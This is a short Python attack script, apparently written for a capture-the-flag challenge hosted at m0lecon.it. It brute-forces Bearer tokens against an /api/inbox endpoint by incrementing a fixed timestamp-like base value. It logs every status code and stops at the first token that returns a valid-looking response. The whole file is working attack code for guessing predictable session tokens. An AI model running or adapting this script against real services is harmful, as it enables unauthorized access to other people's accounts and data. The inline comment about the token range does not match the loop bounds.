import requests

BASE_TOKEN = 1775934371000         # parte fissa
HOST = "193d68e9-d010-4f0f-9a18-69e958dc67f8.offsec.m0lecon.it:8001"
url = f"http://{HOST}/api/inbox"

headers_base = {
    "Accept-Language": "it-IT,it;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Referer": f"http://{HOST}/api/inbox",
    "Connection": "close",
}


for i in range(60 * 999):
                   # 00000 → 99999
    token = BASE_TOKEN + i

    headers = headers_base.copy()
    headers["Authorization"] = f"Bearer {token}"

    r = requests.get(url, headers=headers)
    
    print(f"{token} | {r.status_code} | len={len(r.content)}")

    # esempio di detection
    if r.status_code == 200 and len(r.content) > 50:
        print(" TOKEN  VALIDO:", token)
        break;
